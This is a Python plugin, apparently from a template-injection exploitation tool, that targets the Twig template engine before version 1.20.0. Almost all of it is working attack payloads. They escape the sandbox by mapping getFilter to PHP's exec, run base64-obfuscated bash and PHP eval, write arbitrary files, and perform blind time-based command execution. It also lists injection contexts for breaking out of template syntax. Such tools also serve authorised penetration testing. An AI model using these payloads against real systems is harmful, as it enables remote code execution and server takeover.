from utils.loggers import log
from plugins.languages import php
from plugins.languages import bash
from utils import rand
import string

class Twig(php.Php):
    
    def init(self):

        # The vulnerable versions <1.20.0 allows to map the getFilter() function
        # to any PHP function, allowing the sandbox escape.
        
        # Only functions with 1 parameter can be mapped and eval()/assert() functions are not
        # allowed. For this reason, most of the stuff is done by exec() insted of eval()-like code.

        self.update_actions({
            'render' : {
                'render': '{{%(code)s}}',
                'header': '{{%(header)s}}',
                'trailer': '{{%(trailer)s}}',
                # {{7*'7'}} and a{#b#}c work in freemarker as well
                # {%% set a=%i*%i %%}{{a}} works in Nunjucks as well
                'test_render': '"%(s1)s\n"|nl2br' % { 
                    's1' : rand.randstrings[0]
                },
                'test_render_expected': '%(res)s<br />' % { 
                    'res' : rand.randstrings[0]
                }
            },
            'write' : {
                'call' : 'inject',
                'write' : """{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("bash -c '{tr,_-,/+}<<<%(chunk_b64)s|{base64,--decode}>>%(path)s'")}}""",
                'truncate' : """{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("echo -n >%(path)s")}}"""
            },
            # Hackish way to evaluate PHP code
            'evaluate' : {
                'call': 'execute',
                'evaluate': """php -r '$d="%(code_b64)s";eval(base64_decode(str_pad(strtr($d,"-_","+/"),strlen($d)%%4,"=",STR_PAD_RIGHT)));'""",
                'test_os' : 'echo PHP_OS;',
                'test_os_expected': '^[\w-]+$'
            },
            'execute' : {
                'call': 'render',
                'execute': """_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("bash -c '{eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}'")""",
                'test_cmd': bash.printf % { 's1': rand.randstrings[2] },
                'test_cmd_expected': rand.randstrings[2] 
            },
            'execute_blind' : {
                'call': 'inject',
                'execute_blind': """{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("bash -c '{eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}&&{sleep,%(delay)s}'")}}"""
            },
            'evaluate_blind' : {
                'call': 'execute',
                'evaluate_blind': """php -r '$d="%(code_b64)s";eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%%4,"=",STR_PAD_RIGHT)) . ") && sleep(%(delay)i);");'"""
            },
        })
        
        self.set_contexts([

            # Text context, no closures
            { 'level': 0 },

            { 'level': 1, 'prefix': '%(closure)s}}', 'suffix' : '{{1', 'closures' : php.ctx_closures },
            { 'level': 1, 'prefix': '%(closure)s %%}', 'suffix' : '', 'closures' : php.ctx_closures },
            { 'level': 5, 'prefix': '%(closure)s %%}{%% endfor %%}{%% for a in [1] %%}', 'suffix' : '', 'closures' : php.ctx_closures },

            # This escapes string "inter#{"asd"}polation"
            #{ 'level': 5, 'prefix': '%(closure)s}', 'suffix' : '', 'closures' : php.ctx_closures },

            # This escapes string {% set %s = 1 %}
            { 'level': 5, 'prefix': '%(closure)s = 1 %%}', 'suffix' : '', 'closures' : php.ctx_closures },

        ])
